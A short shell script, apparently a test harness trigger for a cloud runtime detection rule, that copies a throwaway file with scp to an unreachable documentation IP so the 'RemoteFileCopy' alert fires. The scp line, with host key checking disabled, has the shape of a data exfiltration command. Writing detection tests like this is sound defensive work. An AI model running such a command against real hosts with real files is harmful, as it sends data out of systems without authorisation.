#!/bin/sh
#Copyright 2024 Amazon.com, Inc. or its affiliates. All Rights Reserved.
#  
#  Licensed under the Apache License, Version 2.0 (the "License").
#  You may not use this file except in compliance with the License.
#  A copy of the License is located at
#  
#      http://www.apache.org/licenses/LICENSE-2.0
#  
#  or in the "license" file accompanying this file. This file is distributed 
#  on an "AS IS" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either 
#  express or implied. See the License for the specific language governing 
#  permissions and limitations under the License.
#
# Benign trigger for runtime custom detection rule RemoteFileCopy
# Finding type: Execution:Runtime/SuspiciousCommand
#
# Strategy: the harness installs openssh-clients; this runs the REAL `scp` of a
# throwaway temp file to an UNREACHABLE documentation IP (nobody@192.0.2.1:/tmp/,
# RFC 5737 TEST-NET-1, reserved and not globally routable). process.name is the
# genuine 'scp' and the cmd_line matches the scp-to-remote RE2. Nothing is
# copied and no real host is contacted. The destination is unreachable so scp
# blocks for ConnectTimeout seconds before giving up -- this matters empirically:
# a loopback target (127.0.0.1) is refused in milliseconds (RST) and scp exits
# almost instantly, and in that case the rule never fired on any surface, whereas
# scp to an unreachable target (alive ~ConnectTimeout seconds) does fire on EC2.
# Likely mechanism (inferred, not confirmed): the eBPF execve probe observes the
# exec regardless, but the rule matches on process.cmd_line (argv), which is
# enriched in userspace from /proc/<pid>/cmdline and races with a sub-millisecond
# exit -- so the exec is seen but the command line is empty and the RE2 misses.
set -eu

WORKDIR="$(mktemp -d "${TMPDIR:-/tmp}/benign-remote-file-copy.XXXXXX")"

f="$WORKDIR/data"
printf 'benign\n' > "$f"

echo "[cdr] RemoteFileCopy: running real 'scp <tmpfile> nobody@192.0.2.1:/tmp/' (unreachable TEST-NET-1, times out)"
scp -o BatchMode=yes -o StrictHostKeyChecking=no -o ConnectTimeout=8 "$f" nobody@192.0.2.1:/tmp/ || true
echo "[cdr] RemoteFileCopy: done"
